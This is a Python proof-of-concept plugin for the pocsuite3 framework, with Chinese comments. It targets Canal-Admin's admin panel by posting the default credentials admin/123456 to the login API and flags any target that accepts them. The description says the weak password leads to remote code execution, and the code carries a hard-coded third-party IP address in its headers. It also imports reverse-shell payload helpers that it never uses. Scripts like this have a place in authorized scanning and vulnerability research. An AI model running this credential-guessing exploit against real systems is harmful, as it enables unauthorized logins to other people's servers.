
from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)

import argparse
import json
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()
from pocsuite3.modules.listener import REVERSE_PAYLOAD



class canaladminPOC(POCBase):
    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "Ninggo"  # PoC作者的大名
    vulDate = "2022-7-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-13"  # 编写 PoC 的日期
    updateDate = "2022-7-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/cha1Yi/canal-admin"]  # 漏洞地址来源,0day不用写
    name = "Canal-Admin弱口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/cha1Yi/canal-admin"  # 漏洞厂商主页地址
    appName = "Canal-Admin"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            Canal-Admin后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。
        """  # 漏洞简要描述
    pocDesc = """
            直接登录即可
        """  # POC用法描述

    #漏洞检测方法
    def _check(self):
        result = []
        full_url = self.url.strip() + "/api/v1/user/login"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
            "Origin": "http://124.71.183.102:8089", "Connection": "close", "Referer": "http://124.71.183.102:8089/"}
        json = {"password": "123456", "username": "admin"}
        
        try:
            response = requests.post(full_url, headers=headers, json=json,verify=False,timeout=5)
            data_dict = response.json()
            if data_dict.get("code") == 20000 and data_dict.get("message") == None:
                result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()
        #攻击模式即重新调用_verify方法

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass
#未知功能

def other_utils_func():
    pass
#未知功能


# 注册 DemoPOC 类,必须保留并注册
register_poc(canaladminPOC)
